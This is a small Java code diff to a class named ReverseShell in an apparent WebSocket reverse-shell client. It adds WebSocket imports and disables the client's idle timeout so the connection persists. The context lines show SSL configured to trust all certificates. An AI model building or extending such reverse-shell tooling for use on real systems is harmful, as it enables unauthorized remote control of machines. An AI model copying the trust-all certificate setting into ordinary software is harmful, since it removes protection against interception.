@@ -6,6 +6,8 @@ import lombok.Data;
 import lombok.extern.java.Log;
 import org.eclipse.jetty.util.ssl.SslContextFactory;
 import org.eclipse.jetty.websocket.api.Session;
+import org.eclipse.jetty.websocket.api.WebSocketBehavior;
+import org.eclipse.jetty.websocket.api.WebSocketPolicy;
 import org.eclipse.jetty.websocket.client.ClientUpgradeRequest;
 import org.eclipse.jetty.websocket.client.WebSocketClient;
 
@@ -33,7 +35,7 @@ public class ReverseShell implements WebsocketReverseShellService {
         ssl.setTrustAll(true);
 
         this.client = new WebSocketClient(ssl); // give ssl config to client
-
+        this.client.setMaxIdleTimeout(0);
         return this.client;
     }
 
